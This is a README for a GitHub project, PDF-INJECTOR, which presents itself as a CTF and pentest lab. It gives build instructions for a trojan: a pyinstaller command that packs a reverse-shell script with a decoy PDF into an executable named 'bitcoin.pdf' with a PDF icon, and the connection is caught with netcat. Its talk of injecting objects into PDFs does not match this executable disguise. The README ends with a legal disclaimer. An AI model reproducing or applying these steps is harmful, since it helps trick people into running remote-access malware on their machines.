# PDF-INJECTOR 1.0

This project is a laboratory environment for studying code persistence and execution in PDF documents. The goal is to demonstrate how malicious objects can be injected into PDF files to execute remote commands, aiming at the analysis of attack vectors in pentest scenarios and CTF competitions.

The following libraries must be installed: socket, subprocess, os, sys, webbrowser, threading, time. Before using, you must have your PDF and PDF ICO files in the folder. Example files will already be in the repository. It is worth noting that pyinstaller must also be installed. The IP address must be changed in the pdf-injector.py code according to your IP address. After that, it will be necessary to use netcat to receive the connection.

### Demonstração do Payload
![Conexão da Reverse Shell](https://github.com/ronallldd/PDF-INJECTOR/raw/main/05.03.2026_21.00.22_REC.gif)


Command to create the infected pdf

pyinstaller --onefile --noconsole --icon=pdf.ico --add-data "bitcoin.pdf;." --name bitcoin.pdf pdf-injector.py


⚠️ Legal Notice (Disclaimer)
This project was developed strictly for educational and research purposes in controlled environments, such as CTF (Capture The Flag) competitions and cybersecurity study labs.

Ethical Use: Using this material to attack networks, systems, or computers without the explicit written permission of the owner is illegal and unethical.

Responsibility: The author of this project assumes no responsibility for damages caused, misuse of the tools contained herein, or any illegal activities carried out by third parties using this code.

Purpose: The purpose of this tool is to allow security professionals and students to understand attack vectors, test EDR defenses, and improve their ability to detect malicious injections into documents.

By using this repository, you agree that you are solely responsible for your actions and for ensuring that your use complies with all applicable local, state, and federal laws.
